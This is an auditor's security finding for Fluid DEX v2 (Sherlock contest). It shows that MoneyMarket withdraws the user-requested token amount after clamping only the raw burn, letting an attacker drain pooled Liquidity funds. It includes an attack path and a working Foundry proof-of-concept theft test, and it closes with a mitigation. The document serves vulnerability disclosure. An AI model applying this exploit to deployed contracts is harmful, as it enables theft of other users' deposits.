# MoneyMarket normal-supply withdraw clamps only the raw burn, but withdraws the user-requested token amount from Liquidity -> attacker drains pooled funds

**Fluid DEX v2**, Sherlock, January 2026, judged **High**, contest rank 7th  
Contest page: https://audits.sherlock.xyz/contests/1225  
Credited on H-1, User can steal funds using `_processNormalSupplyAction` uncapped withdrawal  
Audited commit: `f20a37ba5a297c54d3d26a26022b952e1f6de841` (https://github.com/sherlock-audit/2026-01-fluid-dex-v2/tree/f20a37ba5a297c54d3d26a26022b952e1f6de841)

This is the submission I sent in. Links into the private contest fork are replaced by file references.

---
### Summary

In the normal-supply withdraw flow, MoneyMarket computes the raw amount to deduct from the user’s NFT position and clamps it to the position’s raw balance. However, it still calls the Liquidity Layer with the original user-controlled token withdrawal amount. Since Liquidity accounts supply per `msg.sender` (MoneyMarket’s aggregate supply), an attacker can withdraw more tokens than their position owns, stealing from pooled Liquidity funded by other users/buffer positions.

### Root Cause

Clamp mismatch: MoneyMarket clamps `withdrawAmountRaw_` (internal accounting) but does not clamp/recompute the token-denominated `supplyAmount_` used in the external transfer.

From `fluid-contracts/contracts/protocols/moneyMarket/core/operateModule/helpers.sol:447-480`:

```solidity
// User is withdrawing
(uint256 supplyExchangePrice_, ) = _getExchangePrices(token_);

uint256 withdrawAmountRaw_;
if (supplyAmount_ == type(int256).min) {
    // full withdraw path computes supplyAmount_ from tokenRawSupply_
    withdrawAmountRaw_ = tokenRawSupply_;
    uint256 withdrawAmount_ = ((tokenRawSupply_ * supplyExchangePrice_) - 1) / LC.EXCHANGE_PRICES_PRECISION;
    if (withdrawAmount_ > 0) withdrawAmount_ -= 1;
    supplyAmount_ = -int256(withdrawAmount_);
} else {
    // partial withdraw path: raw burn derived from user-provided token amount
    withdrawAmountRaw_ =
        (((uint256(-supplyAmount_) * LC.EXCHANGE_PRICES_PRECISION) + 1) / supplyExchangePrice_) + 1;
    if (withdrawAmountRaw_ > tokenRawSupply_) withdrawAmountRaw_ = tokenRawSupply_; // clamps RAW only
}

_updateStorageForWithdraw(..., tokenRawSupply_, withdrawAmountRaw_);
_checkHf(nftId_, IS_OPERATE);

// @audit-issue still withdraws the original user-provided token amount
LIQUIDITY.operate(token_, supplyAmount_, 0, to_, address(0), ...);
```

Liquidity burns raw supply from the caller’s aggregate balance based on the **token amount** requested, rounding up, and reverts only if the caller’s total supply is insufficient:

From liquidity/userModule/main.sol:

```solidity
// withdraw path converts token amount -> raw using mulDivUp (round up)
newSupplyInterestRaw_ = -int256(
    FixedPointMathLib.mulDivUp(uint256(-amount_), EXCHANGE_PRICES_PRECISION, supplyExchangePrice_)
);

// debits msg.sender aggregate supply; if too large, underflow revert happens here
userSupply_ = userSupply_ - uint256(-newSupplyInterestRaw_);
```

### Internal Pre-conditions

- Token is listed and attacker has a normal-supply position (position type 1).
- MoneyMarket has any non-trivial aggregate supply of that token in Liquidity under its own `msg.sender` accounting (normal operating state after deposits; tests also create pooled/buffer supply).

### External Pre-conditions

- Liquidity Layer withdrawal constraints (e.g., withdrawal limits) allow withdrawing the requested amount (or allow repeated withdrawals over time).
- Token is a standard ERC-20 (no weird-token behavior required).

### Attack Path

1. Attacker supplies a small amount of token `T` to open a normal-supply position.
2. Attacker calls `operate(nftId, positionIndex, abi.encode(-int256(hugeWithdraw), attackerEOA))`.
3. MoneyMarket computes `withdrawAmountRaw_` from `hugeWithdraw` and clamps it down to the attacker’s `tokenRawSupply_`.
4. MoneyMarket updates the attacker’s position storage as if only their small raw balance was withdrawn (often deleting the position).
5. MoneyMarket then calls Liquidity with the original large `supplyAmount_ = -hugeWithdraw`.
6. Liquidity transfers `hugeWithdraw` tokens to the attacker, debiting MoneyMarket’s pooled aggregate supply (funded by other users), not the attacker’s position.

### Impact

Direct, permissionless theft of other users principal held as MoneyMarket’s pooled Liquidity supply. The amount drainable is bounded primarily by Liquidity withdrawal constraints and available pooled supply; if limits are per-call/per-window, the attacker can repeat to drain further (Sherlock guidance treats repeatable partial loss as full loss).

### PoC

The PoC demonstrates:
- The attacker receives the full oversized `withdrawRequested` token amount.
- The attacker’s position is deleted (raw burn was clamped to their small balance).
- Therefore, the excess must have been paid out of MoneyMarket’s pooled Liquidity supply.

Add the following to test/foundry/moneyMarket

```solidity

//SPDX-License-Identifier: MIT
pragma solidity ^0.8.29;

import { MoneyMarketTest } from "./main.sol";

import { BigMathMinified } from "../../../contracts/libraries/bigMathMinified.sol";
import { LiquiditySlotsLink } from "../../../contracts/libraries/liquiditySlotsLink.sol";
import { FixedPointMathLib } from "lib/solmate/src/utils/FixedPointMathLib.sol";

/// @notice PoC for the clamp-mismatch bug:
///         MoneyMarket clamps the *raw* amount deducted from the position,
///         but still withdraws the original (potentially larger) token amount
///         from the Liquidity Layer.
contract NormalWithdrawOverdrawPoC is MoneyMarketTest {
    function test_poc_normalWithdraw_canOverdrawBeyondPositionBalance() public {
        // Ensure USDC is listed and buffer position exists (so MoneyMarket has pooled USDC supply).
        _listUSDC();

        // Attacker opens a small normal-supply position.
        uint256 supplied = 2_000 * 1e6;
        USDC.approve(address(moneyMarket), type(uint256).max);

        (uint256 nftId, uint256 supplyPositionIndex) = moneyMarket.operate(
            0,
            0,
            abi.encode(
                uint256(1), // NORMAL_SUPPLY_POSITION_TYPE
                uint256(2), // tokenIndex for USDC (ETH is 1, USDC is 2 after _listUSDC)
                supplied
            )
        );

        uint256 rawSupplied = _getNormalPositionRawAmount(nftId, supplyPositionIndex);
        assertGt(rawSupplied, 0, "expected non-zero raw supply");

        // Attacker requests to withdraw far more than their position holds.
        // This stays below Liquidity's per-call int128 bounds and MoneyMarket's _verifyAmountLimits.
        uint256 withdrawRequested = 8_000 * 1e6;

        uint256 usdcBefore = USDC.balanceOf(address(this));
        moneyMarket.operate(nftId, supplyPositionIndex, abi.encode(-int256(withdrawRequested), address(this)));
        uint256 usdcAfter = USDC.balanceOf(address(this));

        // The attacker receives the full requested token amount...
        assertEq(usdcAfter - usdcBefore, withdrawRequested, "did not receive full requested withdraw");

        // ...but their position only had ~2,000 USDC worth of raw supply.
        // The remainder must have come from pooled MoneyMarket-held USDC supply (other users / buffers).
        uint256 supplyExchangePrice = _getLiquiditySupplyExchangePrice(address(USDC));
        uint256 rawBurnRequired = FixedPointMathLib.mulDivUp(withdrawRequested, 1e12, supplyExchangePrice);
        assertGt(rawBurnRequired, rawSupplied, "withdraw does not exceed position raw balance (unexpected)");

        // Position is deleted because MoneyMarket clamps withdrawAmountRaw_ to rawSupplied.
        assertEq(_loadPositionData(nftId, supplyPositionIndex), 0, "position not deleted after clamped full-withdraw");
    }

    function _getNormalPositionRawAmount(uint256 nftId, uint256 positionIndex) internal view returns (uint256) {
        uint256 positionData = _loadPositionData(nftId, positionIndex);
        // tokenRawAmount lives in bits [17..80] as a 64-bit BigMath number.
        uint256 rawBig = (positionData >> 17) & type(uint64).max;
        return BigMathMinified.fromBigNumber(rawBig, 8, 0xFF);
    }

    function _loadPositionData(uint256 nftId, uint256 positionIndex) internal view returns (uint256) {
        // _positionData[nftId][positionIndex] is a double-mapping at slot 12 (MoneyMarketSlotsLink).
        bytes32 inner = keccak256(abi.encode(nftId, uint256(12)));
        bytes32 slot = keccak256(abi.encode(positionIndex, inner));
        return moneyMarket.readFromStorage(slot);
    }

    function _getLiquiditySupplyExchangePrice(address token) internal view returns (uint256) {
        // Liquidity exchangePricesAndConfig mapping is at slot 5 (LiquiditySlotsLink).
        bytes32 slot = keccak256(abi.encode(token, uint256(LiquiditySlotsLink.LIQUIDITY_EXCHANGE_PRICES_MAPPING_SLOT)));
        uint256 exchangePricesAndConfig = uint256(vm.load(address(liquidity), slot));
        return (exchangePricesAndConfig >> LiquiditySlotsLink.BITS_EXCHANGE_PRICES_SUPPLY_EXCHANGE_PRICE) & type(uint64).max;
    }
}


```


### Mitigation

Ensure the token amount passed to Liquidity is consistent with the raw amount being burned from the user position:

- After clamping `withdrawAmountRaw_`, recompute the maximum withdrawable token amount from the clamped raw using a rounding direction that guarantees Liquidity burns **≤ `withdrawAmountRaw_`** (to avoid ever overdrawing pooled supply), then set:
  - `supplyAmount_ = -int256(withdrawAmountClampedTokens_)`
  - and call `LIQUIDITY.operate(token_, supplyAmount_, ...)` with that clamped token amount.
- Alternative (safer, simpler): if `withdrawAmountRaw_` would exceed `tokenRawSupply_`, revert instead of clamping (unless you add a tightly-justified rounding slack and still clamp the token transfer accordingly).
